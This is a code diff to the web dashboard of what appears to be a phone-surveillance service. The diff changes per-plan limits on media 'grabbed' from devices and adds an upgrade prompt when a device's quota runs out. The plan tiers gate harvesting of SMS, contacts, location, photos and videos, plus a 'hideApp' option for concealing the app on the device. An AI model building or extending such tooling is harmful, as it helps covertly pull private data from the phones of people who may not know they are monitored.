@@ -62,8 +62,8 @@ const getPlanLimits = (plan: string): PlanLimits => {
     const p = (plan || '').toLowerCase();
     if (p === 'enterprise') return { photos: -1, videos: -1, sms: true, contacts: true, torch: true, vibration: true, location: true, hideApp: true, bulkDownload: true, maxDevices: -1, fileManager: true };
     if (p === 'premium') return { photos: -1, videos: -1, sms: true, contacts: true, torch: true, vibration: true, location: true, hideApp: true, bulkDownload: true, maxDevices: 10, fileManager: true };
-    if (p === 'standard') return { photos: -1, videos: -1, sms: true, contacts: true, torch: true, vibration: true, location: false, hideApp: false, bulkDownload: true, maxDevices: 5, fileManager: false };
-    return { photos: 100, videos: 0, sms: false, contacts: false, torch: false, vibration: false, location: false, hideApp: false, bulkDownload: false, maxDevices: 1, fileManager: false };
+    if (p === 'standard') return { photos: 1000, videos: 1000, sms: true, contacts: true, torch: true, vibration: true, location: false, hideApp: false, bulkDownload: false, maxDevices: 5, fileManager: false };
+    return { photos: 600, videos: 0, sms: false, contacts: false, torch: false, vibration: false, location: false, hideApp: false, bulkDownload: false, maxDevices: 1, fileManager: false };
 };
 
 interface HomeProps {
@@ -1087,6 +1087,13 @@ export default function Home(props: any) {
                     setDeviceToast({ name: 'Plan Active', message: `${updatedPlan.toUpperCase()} Unlocked!` });
                     setTimeout(() => setDeviceToast(null), 4000);
                 }
+            });
+
+            socket.on("quota_exceeded", (data: any) => {
+                console.warn("[Socket] Quota exceeded:", data);
+                setIsStartingSync(false);
+                setUploadProgress(null);
+                showUpgradePrompt(data?.message || 'Device Lifetime Media Quota Reached (Upgrade to Premium)', 'premium');
             });
 
             socket.on("progress_update", (data: any) => {
@@ -3306,6 +3313,15 @@ END:VCARD`;
                 onClose={() => setShowSyncOptionsModal(false)}
                 folder={syncOptionsFolder}
                 userPlan={userPlan as any}
+                currentGrabbedCount={(() => {
+                    const currentId = selectedDeviceIdRef.current || selectedDeviceId;
+                    const dev = devices.find(d => {
+                        const id = String(d.deviceId || d.id || d._id || '');
+                        return id === String(currentId);
+                    });
+                    return dev?.totalGrabbedCount || 0;
+                })()}
+                maxAllowedQuota={planLimits.photos}
                 onSync={(mediaType, count, method) => {
                     const effectiveTarget = selectedDeviceIdRef.current || selectedDeviceId || (typeof window !== 'undefined' ? localStorage.getItem('selectedDeviceId') : null);
                     if (method === 'oneByOne') {
